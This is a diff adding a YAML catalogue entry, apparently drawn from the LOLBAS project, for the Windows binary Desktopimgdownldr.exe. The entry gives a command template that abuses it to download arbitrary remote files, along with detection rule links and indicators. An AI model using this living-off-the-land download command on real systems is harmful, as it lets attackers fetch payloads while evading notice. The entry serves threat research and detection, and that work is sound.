@@ -1,0 +1,98 @@
+id: lolbas/T1NCaW5hcmllcy9EZXNrdG9waW1nZG93bmxkci55bWw/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: Desktopimgdownldr.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: desktopimgdownldr.exe that creates non-image file
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
+  - https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
+commands:
+- template: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL}
+    /eventName:desktopimgdownldr
+  comment: Downloads the file and sets it as the computer's lockscreen
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Desktopimgdownldr.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Desktopimgdownldr.yml
+      command_source_index: 0
+      document_utf8: "---\nName: Desktopimgdownldr.exe\nDescription: Windows binary used to configure\
+        \ lockscreen/desktop image\nAuthor: Gal Kristal\nCreated: 2020-06-28\nCommands:\n  - Command:\
+        \ set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL}\
+        \ /eventName:desktopimgdownldr\n    Description: Downloads the file and sets it as the computer's\
+        \ lockscreen\n    Usecase: Download arbitrary files from a web server\n    Category: Download\n\
+        \    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\nFull_Path:\n\
+        \  - Path: c:\\windows\\system32\\desktopimgdownldr.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml\n\
+        \  - IOC: desktopimgdownldr.exe that creates non-image file\n  - IOC: Change of HKLM\\SOFTWARE\\\
+        Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\\LockScreenImageUrl\nResources:\n  - Link:\
+        \ https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\nAcknowledgement:\n\
+        \  - Person: Gal Kristal\n    Handle: '@gal_kristal'\n"
+      document_sha256: sha256:6d93831d1f7bc8354ab18e7ffba84775b65c0a65da2778d081e903071a4b2fcb
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:11af375c32d9896c067ee52e7b08f4e309444982c4ac9b30efc1e9ee007a7b2b
